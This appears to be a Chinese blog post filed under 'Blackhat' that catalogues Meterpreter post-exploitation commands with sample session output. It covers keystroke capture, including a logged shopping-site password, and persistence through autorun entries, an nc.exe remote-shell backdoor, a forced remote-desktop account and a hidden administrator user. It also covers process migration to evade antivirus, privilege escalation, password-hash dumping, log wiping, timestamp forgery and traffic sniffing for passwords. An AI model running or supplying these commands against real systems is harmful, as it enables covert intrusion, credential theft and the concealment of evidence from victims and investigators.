---
title: Meterpreter功能汇总
name: meterpreter
date: 2016-6-5
tags: [meterpreter,持久化访问,键盘嗅探,进程转移,清理日志]
categories: [Blackhat]
---

* 目录
{:toc}

---

# Meterpreter功能汇总

## 键盘嗅探的两种方式

### 通过meterpreter自带keyscan工具

```shell
# 开启键盘监听
meterpreter > keyscan_start
Starting the keystroke sniffer...

# 查询监听到的键盘信息
meterpreter > keyscan_dump
Dumping captured keystrokes...
jd.com15312069323 <Tab> 123456

# 停止键盘监听
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### 通过post/windows/capture/keylog_recorder

```shell
# 使用post/windows/capture/keylog_recorder
meterpreter > run post/windows/capture/keylog_recorder

[*] Executing module against EVAN
[*] Starting the keystroke sniffer...
# 监听记录的文件位置
[*] Keystrokes being saved in to /root/.msf5/loot/20160604202319_default_192.168.3.11_host.windows.key_380125.txt
[*] Recording keystrokes...
```

## 多种持久化访问方式

### 通过persistence脚本

```shell
# -X 开机自启动
# -i <num> payload重连的间隔时间
# -p 反向连接端口号
# -r 反向连接IP地址
#
# 更多使用方法请参考帮助 run persistence -h
meterpreter > run persistence -X -i 5 -p 4444 -r 192.168.3.12
[*] Running Persistance Script
[*] Resource file for cleanup created at /root/.msf5/logs/persistence/EVAN_20160604.3957/EVAN_20160604.3957.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=4444
[*] Persistent agent script is 148461 bytes long
[+] Persistent Script written to C:\DOCUME~1\wangjun\LOCALS~1\Temp\VKZehDGmg.vbs
[*] Executing script C:\DOCUME~1\wangjun\LOCALS~1\Temp\VKZehDGmg.vbs
[+] Agent executed with PID 3892
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\UymiaoVKhfXxH
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\UymiaoVKhfXxH
```

### 通过metsvc服务的方式

运行`run metsvc`将会在目标主机上以Meterpreter的服务的形式注册在服务列表中，并开机自动自动。运行`run metsvc -r`卸载目标主机上的Meterpreter服务。

```shell
meterpreter > run metsvc
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\DOCUME~1\wangjun\LOCALS~1\Temp\PCDqsWgh...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
     * Installing service metsvc
 * Starting service
Service metsvc successfully installed.
```

### 通过开启远程桌面

```shell
# 强制开启目标主机远程桌面并自动添加用户名为metasploit密码为meterpreter的用户
run getgui -u metasploit -p meterpreter
# 上面命令会生成清理痕迹的ruby的脚本文件，位置在/root/.msf4/logs/scripts/getgui/clean_up_xxxxx.rc
# 当操作完目标用户后可以使用此脚本清理痕迹、关闭远程桌面服务和删除创建的用户
un multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up_xxxxx.rc
```

### 通过nc上传新的后门

```shell
# 上传nc.exe至目标主机
meterpreter > upload /root/Desktop/nc.exe c:\\windows\\system32
# 枚举查看注册表启动项
meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
# 将nc.exe设置到注册表启动项中
meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'c:\windows\system32\nc.exe -Ldp 455 -e cmd.exe'
# 查看以确定nc已经被设置到注册表启动项中
meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
# 进入目标系统cmd
eterpreter > execute -f cmd -i
# 查看目标系统当前防火墙规则
c:\Document and Setting\rush\Desktop > netsh firewall show opmode
# 将nc开放的端口加入到目标系统防火墙规则中
c:\Document and Setting\rush\Desktop > netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL
# 查看目标系统防火墙端口开放状态
c:\Document and Setting\rush\Desktop > netsh firewall show portopening

# 转至攻击主机上，执行nc连接到目标主机上，得到shell
nc -v 192.168.0.3 455
```

### 通过在目标主机创建隐藏用户

```shell
# 创建用户（注意这里用户使用了$符号，可以起到隐藏创建用户的目的）
c:\Document and Setting\rush\Desktop > net user hacker$ hacker /add

# 将创建的用户添加到管理员组
c:\Document and Setting\rush\Desktop > net localgroup administrators hacker$ /add
```

## 后面进程内存空间迁移

程迁移的意思是，将原有后门执行的进程迁移到另外一个进程空间中去（这也是我们拿到shell第一步应该做的）。这样做可以避免杀毒软件查杀此进程导致shell中断，也可以避免很容易的猜测中进程列表中后面进程。

### 查看后门进程ID和目标主机所有进程ID

```shell
meterpreter > getpid
Current pid: 1532

meterpreter > ps

Process List
============

 PID   PPID  Name              Arch  Session  User                 Path
 ---   ----  ----              ----  -------  ----                 ----
 0     0     [System Process]
 4     0     System            x86   0
 416   4     smss.exe          x86   0        NT AUTHORITY\SYSTEM  \SystemRoot\System32\smss.exe
 652   416   csrss.exe         x86   0        NT AUTHORITY\SYSTEM  \??\C:\WINDOWS\system32\csrss.exe
 676   416   winlogon.exe      x86   0        NT AUTHORITY\SYSTEM  \??\C:\WINDOWS\system32\winlogon.exe
 720   676   services.exe      x86   0        NT AUTHORITY\SYSTEM  C:\WINDOWS\system32\services.exe
 732   676   lsass.exe         x86   0        NT AUTHORITY\SYSTEM  C:\WINDOWS\system32\lsass.exe
 904   720   VBoxService.exe   x86   0        NT AUTHORITY\SYSTEM  C:\WINDOWS\system32\VBoxService.exe
 952   720   svchost.exe       x86   0        NT AUTHORITY\SYSTEM  C:\WINDOWS\system32\svchost.exe
 1136  720   svchost.exe       x86   0                             C:\WINDOWS\system32\svchost.exe
 1532  1968  a.exe             x86   0        EVAN\wangjun         C:\Documents and Settings\wangjun\����\a.exe
 1584  720   svchost.exe       x86   0        NT AUTHORITY\SYSTEM  C:\WINDOWS\System32\svchost.exe
 1768  720   svchost.exe       x86   0                             C:\WINDOWS\system32\svchost.exe
 1800  1968  ctfmon.exe        x86   0        EVAN\wangjun         C:\WINDOWS\system32\ctfmon.exe
 1936  720   svchost.exe       x86   0                             C:\WINDOWS\system32\svchost.exe
 1968  1860  explorer.exe      x86   0        EVAN\wangjun         C:\WINDOWS\Explorer.EXE
```

从上面的进程列表中看出，后面进程id是1532的a.exe（其实应该将后面程序名称设置成更有迷惑性的，如svchast.exe），此时很容易被用户或者杀毒软件查到。这时应该使用 migrate 进程进程空间转移，转移的目标到进程id是1968的explorer.exe桌面进程中。

### 执行后门进程内存空间转移

```shell
meterpreter > migrate 1968
[*] Migrating from 1532 to 1968...
[*] Migration completed successfully.
```

从上面得知，进程转移成功，后门进程已经成功的从1532转移到了explorer.exe的1968的进程中去了，由于explorer.exe是windows桌面进程，所以无法查杀。原来的1532的后门进程也没有了，此时可以再次使用getpid命令进程进程id查看。

### 查看后门进程转移后的进程ID

```shell
meterpreter > getpid
Current pid: 1968
```

这里要注意的是，有时候使用`migrate`进程进程转移时并不能成功，此时多数情况是当前shell的用户没有权限导致，可以使用`getsystem`获取管理员权限然后再次执行进程转移。

## 调用目标主机本地API

meterpreter中通过irb进入ruby的交互环境，调用目标系统本地API使用的是**railgun**组件。调用目标系统API运行，这个功能有很大的扩展性，相当于在目标系统上编写代码并运行，可以做的事情由你自己发挥。

### 管理员权限获取

```shell
# 查看当前用户
meterpreter > getuid
Server username: EVAN\wangjun
# 获取系统用户权限
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
# 再次查看当前用户，已变更
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 进入ruby交互环境

```shell
# 在meterpreter的shell中使用命令irb进入ruby交互环境
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>>
```

### 使用railgun组件

```shell
# 列出可用的dll
>> client.railgun.known_dll_names
=> ["kernel32", "ntdll", "user32", "ws2_32", "iphlpapi", "advapi32", "shell32", "netapi32", "crypt32", "wlanapi", "wldap32", "version", "psapi"]
# 获取目标系统信息
>> client.sys.config.sysinfo
=> {"Computer"=>"EVAN", "OS"=>"Windows XP (Build 2600, Service Pack 3).", "Architecture"=>"x86", "System Language"=>"zh_CN", "Domain"=>"WORKGROUP", "Logged On Users"=>2}
# 获取当前用户id
>> client.sys.config.getuid
=> "NT AUTHORITY\\SYSTEM"
# 获取所有网卡信息
>> init = client.net.config.interfaces
>> init.each { |x| puts x.pretty }

# 调用消息框函数MessageBoxA弹出信息
>> client.railgun.user32.MessageBoxA(0, "Hello World", "Osanda", "MB_ICONASTERISK | MB_OK" )
# 防止目标主机在meterpreter会话期间进入睡眠状态
>> client.railgun.kernel32.SetThreadExecutionState("ES_CONTINUOUS|ES_SYSTEM_REQUIRED")
# 让目标系统锁屏
>> client.railgun.user32.LockWorkStation()
```

### 键盘记录结合锁屏

原理是先后台开启键盘记录，然后强制锁屏，用户输入密码登录得到用户输入内容。

```shell
# 后台运行键盘记录，每15秒dump到记录文件中
meterpreter > bgrun keylogrecorder -c 1 -t 15
[*] Executed Meterpreter with Job ID 0
meterpreter > [*] winlogon.exe Process found, migrating into 640
[*] Migration Successful!!
[*] Starting the keystroke sniffer...
[*] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt
[*] Recording

# 调用目标系统锁屏函数
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

client.core.use("railgun")
=> true
client.railgun.user32.LockWorkStation()
=> {"GetLastError"=>0, "return"=>true}
exit

meterpreter >
meterpreter > bglist
[*] Job 0: ["keylogrecorder", "-c", "1", "-t", "15"]
meterpreter > bgkill 0
[*] Killing background job 0...
meterpreter >
```

更多的windows函数请自行参考msdn自由发挥，查找本地**railgun**函数，在终端中输入`locate railgun`即可。

## 安卓中的特殊功能

### 移除目标锁屏

```shell
post/android/manage/remove_lock
```

### 隐藏木马应用图标

```shell
> hide_app_icon
```

## 其他常用功能汇总

### windows中hash密码的使用

拿到目标主机hashdump值目的就是获取目标主机的登录密码，可以通过**L0phtCrack**或者**ophcrack**等工具进行破解得到明文密码。但有时候也并不是需要破解hash值，metasploit里有很多功能功能可以通过hash传递获取目标主机权限。

```shell
# dump出目标主机用户名密码
meterpreter > hashdump
admin:1007:f0d412bd764ffe81aad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:496f4dcd132458b604fd1c9a01b28dc9:788d18962d30303246126d61f1fed54c:::
metasploit:1006:ab594876e19d0e7b3fa46817fc0ee1fb:d1508f574ec4ce7358fb0c87949072a7:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:00f0e7d86e6837feb487c8f18eeace02:::
wangjun:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### 终端shell权限提升

```shell
# 查看当前用户
meterpreter > getuid
Server username: EVAN\wangjun
# 获取系统用户权限
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
# 再次查看当前用户，已变更
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 清理踪迹日志

当在目标主机上做了很多操作时，系统默认将一些特殊的操作以日志的形式记录在系统中，如果不刻意的清理日志，很容易会被追查出来。

```shell
meterpreter > clearev
[*] Wiping 0 records from Application...
[*] Wiping 0 records from System...
```

### 修改文件时间戳

对目标系统某个文件进行操作后，默认文件的时间会更新，在一些谨慎的管理员眼中很容易识别出文件已经被修改过或查阅过，此时需要将文件的时间戳改变为初始的状态。

```shell
# 查看文件的MACE值得，MACE是四个时间的首字母
meterpreter > timestomp -v secret.doc
Modified      : 2016-06-04 22:25:44 +0800
Accessed      : 2016-06-04 23:20:41 +0800
Created       : 2016-06-04 22:25:44 +0800
Entry Modified: 2016-06-04 22:30:36 +0800
# 修改目标文件时间
meterpreter > timestomp secret.doc -c "1/15/2015 15:15:25"
meterpreter > timestomp secret.doc -a "1/15/2015 15:15:25"
meterpreter > timestomp secret.doc -m "1/15/2015 15:15:25"
meterpreter > timestomp secret.doc -e "1/15/2015 15:15:25"
# 以另一个文件的时间戳为基础修改
meterpreter > timestomp secret.doc -f C:\\WINNT\\system32\\cmd.exe
```

### 在目标系统上执行和搜索文件

同属于文件系统命令，上传下载都很简单，搜索和执行文件由于有特殊参数所以这里点一下。

```shell
# 运行目标机器上程序
meterpreter > execute -f c:\\windows\\notepad.exe
Process 2132 created.
# 加上-H表示隐藏的执行
meterpreter > execute -f -H c:\\windows\\notepad.exe
# 在指定目录下搜索指定文件
meterpreter > search -d c:\\windows\\system32 -f hosts
```

### 在目标系统上使用vnc远程桌面

为了可以实时观察目标主机桌面操作情况，可以开始vnc服务，原理是上传vnc的服务，远程执行并连接。vnc不同与3389的远程桌面，若用远程桌面连接则会中断用户操作。

```shell
# 开启目标主机vnc服务
meterpreter > run vnc
[*] Creating a VNC reverse tcp stager: LHOST=192.168.3.12 LPORT=4545
[*] Running payload handler
[*] VNC stager executable 73802 bytes long
[*] Uploaded the VNC agent to C:\DOCUME~1\wangjun\LOCALS~1\Temp\iwbSDvEUrDEU.exe (must be deleted manually)
[*] Executing the VNC agent with endpoint 192.168.3.12:4545...
```

### 查看目标主机安装的程序、补丁以及最近操作的文件

很多情况我们需要知道目标系统上到底安装了哪些软件，以便我们针对不同安装的软件进行渗透操作。也许你希望查看用户最近操作了哪些文件或者程序。

```shell
# 获取目标主机最近进行的系统操作、访问文件和office文档操作记录
meterpreter > run post/windows/gather/dumplinks
# 获取目标主机安装的软件、安全更新与漏洞补丁信息
meterpreter > run post/windows/gather/enum_applications
```

### 抓取目标主机网络流量

使用sniffer可以获取用户网络IO流量，用于分析目标主机网络数据。

```shell
# 查看目标主机网络接口
meterpreter > sniffer_interfaces
# 指定网卡编号进行嗅探抓包
meterpreter > sniffer_start 1 30000
# 查看当前抓包的情况
meterpreter > sniffer_stats 1
# 将流量数据写入cap文件
meterpreter > sniffer_dump 1 /tmp/capture.cap
# 关闭嗅探
meterpreter > sniffer_stop 1

# 使用tshark分析cap数据包获取私密信息
[root@kalibook 00:06:56 ~]# tshark -r /tmp/capture.cap | grep PASS
# 使用wireshark分析cap数据包
[root@kalibook 00:06:56 ~]# wireshark /tmp/capture.cap
```